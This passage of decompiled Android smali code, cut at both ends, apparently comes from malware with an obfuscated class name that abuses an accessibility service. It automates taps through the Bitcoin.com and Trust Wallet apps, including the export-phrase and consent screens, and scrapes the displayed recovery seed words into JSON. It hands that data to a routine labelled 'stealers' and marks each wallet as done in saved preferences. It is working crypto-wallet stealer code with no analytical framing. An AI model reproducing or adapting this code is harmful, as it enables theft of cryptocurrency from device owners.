    invoke-virtual {v13, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v13

    const-string v15, "ZS9TR2psNzhKZ0dHWUZINUJLa3ZUUT09OjpZbTh2Z21VRmlCODM5Skl0aUpXREd3PT0="

    const-string v15, "BTC"
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_6

    move-object/from16 v24, v6

    const/4 v6, 0x1

    :try_start_10
    invoke-virtual {v7, v15, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    invoke-static/range {v17 .. v17}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    invoke-static {v9, v6}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v7, v6, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v17, v17, 0x1

    if-lt v5, v2, :cond_1c

    goto :goto_16

    :cond_1c
    move v13, v5

    move-object/from16 v5, v22

    move-object/from16 v15, v23

    move-object/from16 v6, v24

    goto :goto_13

    :catchall_6
    move-exception v0

    :goto_14
    move-object/from16 v24, v6

    :goto_15
    move-object v2, v0

    goto/16 :goto_21

    :cond_1d
    move-object/from16 v22, v5

    move-object/from16 v24, v6

    move-object/from16 v21, v13

    :goto_16
    if-lt v4, v3, :cond_1e

    goto :goto_18

    :cond_1e
    move v15, v4

    move/from16 v4, v17

    move-object/from16 v2, v20

    move-object/from16 v13, v21

    move-object/from16 v5, v22

    move-object/from16 v6, v24

    goto :goto_12

    :goto_17
    const/16 v17, 0x0

    :goto_18
    invoke-virtual {v7}, Lorg/json/JSONObject;->length()I

    move-result v2

    if-lez v2, :cond_21

    sget-object v2, Lc0/b;->a:Lc0/b;

    const-string v3, "com.bitcoin.mwallet"

    invoke-virtual {v7}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v2, v1, v3, v4, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "bitcoincom"

    const-string v3, "1"

    .line 7
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_1f

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_1f
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    const/4 v2, 0x1

    .line 8
    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iput-boolean v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->c:Z

    goto :goto_1a

    :catchall_7
    move-exception v0

    move-object/from16 v22, v5

    move-object/from16 v24, v6

    move-object/from16 v21, v13

    goto :goto_15

    :cond_20
    :goto_19
    move-object/from16 v21, v4

    move-object/from16 v22, v5

    move-object/from16 v24, v6

    const/16 v17, 0x0

    :cond_21
    :goto_1a
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_22

    goto/16 :goto_23

    :cond_22
    const-string v3, "com.bitcoin.mwallet:id/walletName"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_23

    goto/16 :goto_23

    :cond_23
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_24
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_25

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v4, v14}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "ETH"

    const/4 v6, 0x2

    const/4 v13, 0x0

    invoke-static {v4, v5, v13, v6}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v4

    if-eqz v4, :cond_24

    goto :goto_1b

    :cond_25
    const/4 v3, 0x0

    :goto_1b
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_26

    goto/16 :goto_23

    :cond_26
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-static {v2, v8}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v2, v4, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x96

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_27

    goto :goto_1c

    :cond_27
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_1c
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_28

    goto :goto_20

    :cond_28
    const-string v3, "com.bitcoin.mwallet:id/mnemonicTable"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_29

    goto :goto_20

    :cond_29
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_2a

    goto :goto_20

    :cond_2a
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-lez v3, :cond_2e

    const/4 v4, 0x0

    :goto_1d
    add-int/lit8 v5, v4, 0x1

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v6

    if-lez v6, :cond_2c

    const/4 v13, 0x0

    :goto_1e
    add-int/lit8 v14, v13, 0x1

    invoke-virtual {v4, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    const/4 v15, 0x0

    invoke-virtual {v13, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v13

    invoke-virtual {v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v13

    const-string v15, "a29qdVFHWVRyeEZhcGNkVzdnaHVqZz09OjpKZGdlZ25jM3YrZWJDNUIrN3g5Y293PT0="

    const-string v15, "ETH"

    move-object/from16 v20, v2

    const/4 v2, 0x1

    invoke-virtual {v7, v15, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    invoke-static/range {v17 .. v17}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v9, v2}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v7, v2, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    add-int/lit8 v17, v17, 0x1

    if-lt v14, v6, :cond_2b

    goto :goto_1f

    :cond_2b
    move v13, v14

    move-object/from16 v2, v20

    goto :goto_1e

    :cond_2c
    move-object/from16 v20, v2

    :goto_1f
    if-lt v5, v3, :cond_2d

    goto :goto_20

    :cond_2d
    move v4, v5

    move-object/from16 v2, v20

    goto :goto_1d

    :cond_2e
    :goto_20
    invoke-virtual {v7}, Lorg/json/JSONObject;->length()I

    move-result v2

    if-lez v2, :cond_31

    sget-object v2, Lc0/b;->a:Lc0/b;

    const-string v3, "com.bitcoin.mwallet"

    invoke-virtual {v7}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v2, v1, v3, v4, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "bitcoincom"

    const-string v3, "1"

    .line 9
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_2f

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_2f
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 10
    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_8

    goto :goto_23

    :catchall_8
    move-exception v0

    goto/16 :goto_15

    :cond_30
    move-object/from16 v21, v4

    move-object/from16 v22, v5

    move-object/from16 v24, v6

    goto :goto_23

    :catchall_9
    move-exception v0

    move-object/from16 v21, v4

    move-object/from16 v22, v5

    goto/16 :goto_14

    :goto_21
    move-object v7, v2

    :goto_22
    invoke-static {v7}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_31
    :goto_23
    :try_start_11
    iget-object v2, v1, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    sget-object v3, Lb0/b;->a:Lb0/b;

    invoke-virtual {v3}, Lb0/b;->k()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x2

    const/4 v5, 0x0

    invoke-static {v2, v3, v5, v4}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v2

    if-eqz v2, :cond_5a

    const-string v2, "trust"

    .line 11
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_c

    if-nez v3, :cond_32

    :try_start_12
    invoke-static {v10}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v1, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    sput-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;
    :try_end_12
    .catchall {:try_start_12 .. :try_end_12} :catchall_a

    goto :goto_24

    :catchall_a
    move-exception v0

    move-object v2, v0

    goto/16 :goto_31

    :cond_32
    :goto_24
    :try_start_13
    sget-object v3, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v3}, Ls0/c;->g(Ljava/lang/Object;)V

    const/4 v4, 0x0

    invoke-interface {v3, v2, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_5a

    .line 12
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_33

    goto :goto_26

    :cond_33
    const-string v3, "com.wallet.crypto.trustapp:id/graph_settings"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_34

    goto :goto_26

    :cond_34
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_35
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3
    :try_end_13
    .catchall {:try_start_13 .. :try_end_13} :catchall_c

    if-eqz v3, :cond_36

    :try_start_14
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4
    :try_end_14
    .catchall {:try_start_14 .. :try_end_14} :catchall_a

    if-eqz v4, :cond_35

    goto :goto_25

    :cond_36
    const/4 v3, 0x0

    :goto_25
    :try_start_15
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_37

    goto :goto_26

    :cond_37
    const/4 v2, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v3, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_26
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_38

    goto :goto_28

    :cond_38
    const-string v3, "com.wallet.crypto.trustapp:id/wallets_preference"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_39

    goto :goto_28

    :cond_39
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_3a
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3
    :try_end_15
    .catchall {:try_start_15 .. :try_end_15} :catchall_c

    if-eqz v3, :cond_3b

    :try_start_16
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4
    :try_end_16
    .catchall {:try_start_16 .. :try_end_16} :catchall_a

    if-eqz v4, :cond_3a

    goto :goto_27

    :cond_3b
    const/4 v3, 0x0

    :goto_27
    :try_start_17
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_3c

    goto :goto_28

    :cond_3c
    const/4 v2, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v3, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_28
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_3d

    goto :goto_2a

    :cond_3d
    const-string v3, "com.wallet.crypto.trustapp:id/item_wallet_info_action"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_3e

    goto :goto_2a

    :cond_3e
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_3f
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3
    :try_end_17
    .catchall {:try_start_17 .. :try_end_17} :catchall_c

    if-eqz v3, :cond_40

    :try_start_18
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4
    :try_end_18
    .catchall {:try_start_18 .. :try_end_18} :catchall_a

    if-eqz v4, :cond_3f

    goto :goto_29

    :cond_40
    const/4 v3, 0x0

    :goto_29
    :try_start_19
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_41

    goto :goto_2a

    :cond_41
    const/4 v2, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v3, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_2a
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_42

    goto :goto_2c

    :cond_42
    const-string v3, "com.wallet.crypto.trustapp:id/export_phrase_action"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_43

    goto :goto_2c

    :cond_43
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_44
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3
    :try_end_19
    .catchall {:try_start_19 .. :try_end_19} :catchall_c

    if-eqz v3, :cond_45

    :try_start_1a
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4
    :try_end_1a
    .catchall {:try_start_1a .. :try_end_1a} :catchall_a

    if-eqz v4, :cond_44

    goto :goto_2b

    :cond_45
    const/4 v3, 0x0

    :goto_2b
    :try_start_1b
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_46

    goto :goto_2c

    :cond_46
    const/4 v2, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v3, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_2c
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_47

    goto :goto_30

    :cond_47
    const-string v3, "com.wallet.crypto.trustapp:id/concent"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_48

    goto :goto_30

    :cond_48
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_49
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3
    :try_end_1b
    .catchall {:try_start_1b .. :try_end_1b} :catchall_c

    if-eqz v3, :cond_4c

    :try_start_1c
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v5

    if-nez v5, :cond_4b

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4
    :try_end_1c
    .catchall {:try_start_1c .. :try_end_1c} :catchall_a

    if-eqz v4, :cond_4a

    goto :goto_2d

    :cond_4a
    const/4 v4, 0x0

    goto :goto_2e

    :cond_4b
    :goto_2d
    const/4 v4, 0x1

    :goto_2e
    if-eqz v4, :cond_49

    goto :goto_2f

    :cond_4c
    const/4 v3, 0x0

    :goto_2f
    :try_start_1d
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_4d

    goto :goto_30

    :cond_4d
    invoke-virtual {v1, v3}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v2
    :try_end_1d
    .catchall {:try_start_1d .. :try_end_1d} :catchall_c

    if-nez v2, :cond_4e

    const/4 v2, 0x2

    const/4 v4, 0x0

    :try_start_1e
    invoke-static {v1, v3, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V
    :try_end_1e
    .catchall {:try_start_1e .. :try_end_1e} :catchall_a

    :cond_4e
    :goto_30
    :try_start_1f
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_4f

    goto :goto_33

    :cond_4f
    const-string v3, "com.wallet.crypto.trustapp:id/next"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_50

    goto :goto_33

    :cond_50
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_51
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3
    :try_end_1f
    .catchall {:try_start_1f .. :try_end_1f} :catchall_c

    if-eqz v3, :cond_52

    :try_start_20
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    move-object v4, v3

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v4
    :try_end_20
    .catchall {:try_start_20 .. :try_end_20} :catchall_a

    if-eqz v4, :cond_51

    goto :goto_32

    :goto_31
    move-object/from16 v15, v24

    goto/16 :goto_38

    :cond_52
    const/4 v3, 0x0

    :goto_32
    :try_start_21
    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v3, :cond_53

    goto :goto_33

    :cond_53
    const/4 v2, 0x2

    const/4 v4, 0x0

    invoke-static {v1, v3, v4, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o(Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;Landroid/view/accessibility/AccessibilityNodeInfo;ZI)V

    :goto_33
    invoke-virtual/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_54

    goto/16 :goto_37

    :cond_54
    const-string v3, "com.wallet.crypto.trustapp:id/phrase"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_55

    goto/16 :goto_37

    :cond_55
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_56

    goto/16 :goto_37

    :cond_56
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    if-lez v4, :cond_58

    const/4 v5, 0x0

    :goto_34
    add-int/lit8 v6, v5, 0x1

    invoke-virtual {v2, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    const/4 v13, 0x0

    invoke-virtual {v7, v13}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v14

    invoke-virtual {v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v13

    const/4 v14, 0x1

    invoke-virtual {v7, v14}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v14
    :try_end_21
    .catchall {:try_start_21 .. :try_end_21} :catchall_c

    move-object/from16 v15, v24

    :try_start_22
    invoke-static {v15, v14}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v3, v14, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v9, v5}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    if-lt v6, v4, :cond_57

    goto :goto_35

    :cond_57
    move v5, v6

    move-object/from16 v24, v15

    goto :goto_34

    :cond_58
    move-object/from16 v15, v24

    :goto_35
    invoke-virtual {v3}, Lorg/json/JSONObject;->length()I

    move-result v2

    if-lez v2, :cond_5b

    sget-object v2, Lc0/b;->a:Lc0/b;

    const-string v4, "com.wallet.crypto.trustappt"

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v12}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v5, "stealers"

    invoke-virtual {v2, v1, v4, v3, v5}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "trust"

    const-string v3, "1"

    .line 13
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v4, :cond_59

    invoke-static {v11}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    sput-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_59
    sget-object v4, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
